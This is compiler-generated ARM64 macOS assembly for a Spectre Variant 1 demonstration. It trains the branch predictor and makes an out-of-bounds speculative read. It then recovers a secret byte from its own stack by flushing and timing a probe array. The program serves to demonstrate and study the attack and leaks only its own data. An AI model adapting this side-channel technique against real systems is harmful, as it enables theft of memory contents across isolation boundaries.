	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 15, 5
	.globl	_flush_probe_array              ; -- Begin function flush_probe_array
	.p2align	2
_flush_probe_array:                     ; @flush_probe_array
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	str	wzr, [sp, #12]
	b	LBB0_1
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #12]
	subs	w8, w8, #256
	b.ge	LBB0_4
	b	LBB0_2
LBB0_2:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldr	w8, [sp, #12]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x8, x8, w9, sxtw
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	b	LBB0_3
LBB0_3:                                 ;   in Loop: Header=BB0_1 Depth=1
	ldr	w8, [sp, #12]
	add	w8, w8, #1
	str	w8, [sp, #12]
	b	LBB0_1
LBB0_4:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_mfence                     ; -- Begin function _mm_mfence
	.p2align	2
__mm_mfence:                            ; @_mm_mfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_lfence                     ; -- Begin function _mm_lfence
	.p2align	2
__mm_lfence:                            ; @_mm_lfence
	.cfi_startproc
; %bb.0:
	; InlineAsm Start
	dsb	ish
	; InlineAsm End
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	__mm_clflush                    ; -- Begin function _mm_clflush
	.p2align	2
__mm_clflush:                           ; @_mm_clflush
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	; InlineAsm Start
	dc	civac, x8
	; InlineAsm End
	add	sp, sp, #16
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_measure_access_time            ; -- Begin function measure_access_time
	.p2align	2
_measure_access_time:                   ; @measure_access_time
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #48
	stp	x29, x30, [sp, #32]             ; 16-byte Folded Spill
	add	x29, sp, #32
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	x0, [x29, #-8]
	bl	_rdtsc
	str	x0, [sp, #16]
	ldur	x8, [x29, #-8]
	ldrb	w8, [x8]
	strb	w8, [sp, #7]
	bl	__mm_mfence
	bl	_rdtsc
	str	x0, [sp, #8]
	ldr	x8, [sp, #8]
	ldr	x9, [sp, #16]
	subs	x0, x8, x9
	ldp	x29, x30, [sp, #32]             ; 16-byte Folded Reload
	add	sp, sp, #48
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_benign_target                  ; -- Begin function benign_target
	.p2align	2
_benign_target:                         ; @benign_target
	.cfi_startproc
; %bb.0:
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_common_init                    ; -- Begin function common_init
	.p2align	2
_common_init:                           ; @common_init
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	x1, #16384                      ; =0x4000
	adrp	x0, _probe_array@GOTPAGE
	ldr	x0, [x0, _probe_array@GOTPAGEOFF]
	bl	_bzero
	stur	wzr, [x29, #-4]
	b	LBB6_1
LBB6_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-4]
	subs	w8, w8, #4, lsl #12             ; =16384
	b.ge	LBB6_4
	b	LBB6_2
LBB6_2:                                 ;   in Loop: Header=BB6_1 Depth=1
	ldursw	x9, [x29, #-4]
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x9, x8, x9
	mov	w8, #1                          ; =0x1
	strb	w8, [x9]
	b	LBB6_3
LBB6_3:                                 ;   in Loop: Header=BB6_1 Depth=1
	ldur	w8, [x29, #-4]
	add	w8, w8, #64
	stur	w8, [x29, #-4]
	b	LBB6_1
LBB6_4:
	bl	__mm_mfence
	bl	_flush_probe_array
	bl	__mm_mfence
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_perform_measurement            ; -- Begin function perform_measurement
	.p2align	2
_perform_measurement:                   ; @perform_measurement
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #112
	stp	x29, x30, [sp, #96]             ; 16-byte Folded Spill
	add	x29, sp, #96
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	sturb	w0, [x29, #-5]
	stur	x1, [x29, #-16]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	mov	w8, #-1                         ; =0xffffffff
	stur	w8, [x29, #-20]
	mov	x8, #-1                         ; =0xffffffffffffffff
	stur	x8, [x29, #-32]
	mov	w8, #100                        ; =0x64
	stur	w8, [x29, #-36]
	stur	wzr, [x29, #-40]
	b	LBB7_1
LBB7_1:                                 ; =>This Inner Loop Header: Depth=1
	ldur	w8, [x29, #-40]
	subs	w8, w8, #256
	b.ge	LBB7_8
	b	LBB7_2
LBB7_2:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	w8, [x29, #-40]
	lsl	w9, w8, #6
	adrp	x8, _probe_array@GOTPAGE
	ldr	x8, [x8, _probe_array@GOTPAGEOFF]
	add	x8, x8, w9, sxtw
	str	x8, [sp, #48]
	ldr	x0, [sp, #48]
	bl	_measure_access_time
	str	x0, [sp, #40]
	ldr	x8, [sp, #40]
	ldursw	x9, [x29, #-36]
	subs	x8, x8, x9
	b.ge	LBB7_6
	b	LBB7_3
LBB7_3:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	x8, [x29, #-32]
	adds	x8, x8, #1
	b.eq	LBB7_5
	b	LBB7_4
LBB7_4:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldr	x8, [sp, #40]
	ldur	x9, [x29, #-32]
	subs	x8, x8, x9
	b.ge	LBB7_6
	b	LBB7_5
LBB7_5:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldr	x8, [sp, #40]
	stur	x8, [x29, #-32]
	ldur	w8, [x29, #-40]
	stur	w8, [x29, #-20]
	b	LBB7_6
LBB7_6:                                 ;   in Loop: Header=BB7_1 Depth=1
	b	LBB7_7
LBB7_7:                                 ;   in Loop: Header=BB7_1 Depth=1
	ldur	w8, [x29, #-40]
	add	w8, w8, #1
	stur	w8, [x29, #-40]
	b	LBB7_1
LBB7_8:
	ldur	w8, [x29, #-20]
	adds	w8, w8, #1
	b.eq	LBB7_12
	b	LBB7_9
LBB7_9:
	ldur	x11, [x29, #-16]
	ldur	w12, [x29, #-20]
	ldur	w8, [x29, #-20]
	mov	x10, x8
	ldur	x8, [x29, #-32]
	mov	x9, sp
	str	x11, [x9]
                                        ; implicit-def: $x11
	mov	x11, x12
	sxtb	x11, w11
	str	x11, [x9, #8]
	str	x10, [x9, #16]
	str	x8, [x9, #24]
	adrp	x0, l_.str.1@PAGE
	add	x0, x0, l_.str.1@PAGEOFF
	bl	_printf
	ldur	w8, [x29, #-20]
	ldurb	w9, [x29, #-5]
	subs	w8, w8, w9
	b.ne	LBB7_11
	b	LBB7_10
LBB7_10:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.2@PAGE
	add	x0, x0, l_.str.2@PAGEOFF
	bl	_printf
	mov	w8, #1                          ; =0x1
	stur	w8, [x29, #-4]
	b	LBB7_13
LBB7_11:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.3@PAGE
	add	x0, x0, l_.str.3@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB7_13
LBB7_12:
	ldur	x8, [x29, #-16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.4@PAGE
	add	x0, x0, l_.str.4@PAGEOFF
	bl	_printf
	stur	wzr, [x29, #-4]
	b	LBB7_13
LBB7_13:
	ldur	w0, [x29, #-4]
	ldp	x29, x30, [sp, #96]             ; 16-byte Folded Reload
	add	sp, sp, #112
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_speculative_read_v1_local      ; -- Begin function speculative_read_v1_local
	.p2align	2
_speculative_read_v1_local:             ; @speculative_read_v1_local
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #48
	.cfi_def_cfa_offset 48
	str	x0, [sp, #40]
	str	x1, [sp, #32]
	str	x2, [sp, #24]
	str	x3, [sp, #16]
	ldr	x8, [sp, #16]
	ldr	x9, [sp, #32]
	subs	x8, x8, x9
	b.hs	LBB8_2
	b	LBB8_1
LBB8_1:
	ldr	x8, [sp, #40]
	ldr	x9, [sp, #16]
	add	x8, x8, x9
	ldrb	w8, [x8]
	strb	w8, [sp, #15]
	ldr	x8, [sp, #24]
	ldrb	w9, [sp, #15]
	lsl	w9, w9, #6
	add	x9, x8, w9, sxtw
	mov	w8, #1                          ; =0x1
	strb	w8, [x9]
	b	LBB8_2
LBB8_2:
	add	sp, sp, #48
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_main_spectre_v1_stack          ; -- Begin function main_spectre_v1_stack
	.p2align	2
_main_spectre_v1_stack:                 ; @main_spectre_v1_stack
	.cfi_startproc
; %bb.0:
	stp	x28, x27, [sp, #-32]!           ; 16-byte Folded Spill
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	mov	w9, #16464                      ; =0x4050
Lloh0:
	adrp	x16, ___chkstk_darwin@GOTPAGE
Lloh1:
	ldr	x16, [x16, ___chkstk_darwin@GOTPAGEOFF]
	blr	x16
	sub	sp, sp, #4, lsl #12             ; =16384
	sub	sp, sp, #80
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	stur	x8, [x29, #-24]
	adrp	x8, l___const.main_spectre_v1_stack.public_array@PAGE
	add	x8, x8, l___const.main_spectre_v1_stack.public_array@PAGEOFF
	ldr	q0, [x8]
	stur	q0, [x29, #-48]
	mov	w8, #83                         ; =0x53
	strb	w8, [sp, #47]
	mov	x8, #16                         ; =0x10
	str	x8, [sp, #32]
	add	x0, sp, #48
	mov	x1, #16384                      ; =0x4000
	bl	_bzero
	bl	_common_init
	adrp	x0, l_.str.5@PAGE
	add	x0, x0, l_.str.5@PAGEOFF
	bl	_printf
	adrp	x0, l_.str.6@PAGE
	add	x0, x0, l_.str.6@PAGEOFF
	bl	_printf
	str	wzr, [sp, #28]
	b	LBB9_1
LBB9_1:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #28]
	subs	w8, w8, #1000
	b.ge	LBB9_4
	b	LBB9_2
LBB9_2:                                 ;   in Loop: Header=BB9_1 Depth=1
	ldr	x1, [sp, #32]
	ldrsw	x8, [sp, #28]
	ldr	x10, [sp, #32]
	udiv	x9, x8, x10
	mul	x9, x9, x10
	subs	x3, x8, x9
	sub	x0, x29, #48
	add	x2, sp, #48
	bl	_speculative_read_v1_local
	b	LBB9_3
LBB9_3:                                 ;   in Loop: Header=BB9_1 Depth=1
	ldr	w8, [sp, #28]
	add	w8, w8, #1
	str	w8, [sp, #28]
	b	LBB9_1
LBB9_4:
	bl	__mm_mfence
	bl	_flush_probe_array
	bl	__mm_mfence
	add	x8, sp, #47
	sub	x9, x29, #48
	str	x9, [sp, #8]                    ; 8-byte Folded Spill
	subs	x8, x8, x9
	str	x8, [sp, #16]
	ldr	x8, [sp, #16]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str.7@PAGE
	add	x0, x0, l_.str.7@PAGEOFF
	bl	_printf
	ldr	x0, [sp, #8]                    ; 8-byte Folded Reload
	ldr	x1, [sp, #32]
	ldr	x3, [sp, #16]
	add	x2, sp, #48
	bl	_speculative_read_v1_local
	bl	__mm_mfence
	ldrb	w0, [sp, #47]
	adrp	x1, l_.str.8@PAGE
	add	x1, x1, l_.str.8@PAGEOFF
	bl	_perform_measurement
	ldrb	w10, [sp, #47]
	mov	x9, sp
                                        ; implicit-def: $x8
	mov	x8, x10
	str	x8, [x9]
	adrp	x0, l_.str.9@PAGE
	add	x0, x0, l_.str.9@PAGEOFF
	bl	_printf
	ldur	x9, [x29, #-24]
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	subs	x8, x8, x9
	b.eq	LBB9_6
	b	LBB9_5
LBB9_5:
	bl	___stack_chk_fail
LBB9_6:
	mov	w0, #0                          ; =0x0
	add	sp, sp, #4, lsl #12             ; =16384
	add	sp, sp, #80
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	ldp	x28, x27, [sp], #32             ; 16-byte Folded Reload
	ret
	.loh AdrpLdrGot	Lloh0, Lloh1
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	wzr, [x29, #-4]
	bl	_main_spectre_v1_stack
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.p2align	2                               ; -- Begin function rdtsc
_rdtsc:                                 ; @rdtsc
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	mov	w0, #6                          ; =0x6
	mov	x1, sp
	bl	_clock_gettime
	ldr	x8, [sp]
	mov	x9, #51712                      ; =0xca00
	movk	x9, #15258, lsl #16
	mul	x8, x8, x9
	ldr	x9, [sp, #8]
	add	x0, x8, x9
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.comm	_probe_array,16384,0            ; @probe_array
	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"Measuring cache timings...\n"

l_.str.1:                               ; @.str.1
	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld ns\n"

l_.str.2:                               ; @.str.2
	.asciz	"SUCCESS! Leaked the actual %s.\n"

l_.str.3:                               ; @.str.3
	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"

l_.str.4:                               ; @.str.4
	.asciz	"No %s leaked or could not detect leakage.\n"

	.section	__TEXT,__literal16,16byte_literals
l___const.main_spectre_v1_stack.public_array: ; @__const.main_spectre_v1_stack.public_array
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"

	.section	__TEXT,__cstring,cstring_literals
l_.str.5:                               ; @.str.5
	.asciz	"\n--- Running Spectre Variant 1 (Stack, Bounds Check Bypass) Demo ---\n"

l_.str.6:                               ; @.str.6
	.asciz	"Training branch predictor...\n"

l_.str.7:                               ; @.str.7
	.asciz	"Attempting to leak secret data from OOB index %zu...\n"

l_.str.8:                               ; @.str.8
	.asciz	"Spectre V1 secret"

l_.str.9:                               ; @.str.9
	.asciz	"Actual secret data: %c\n"

.subsections_via_symbols
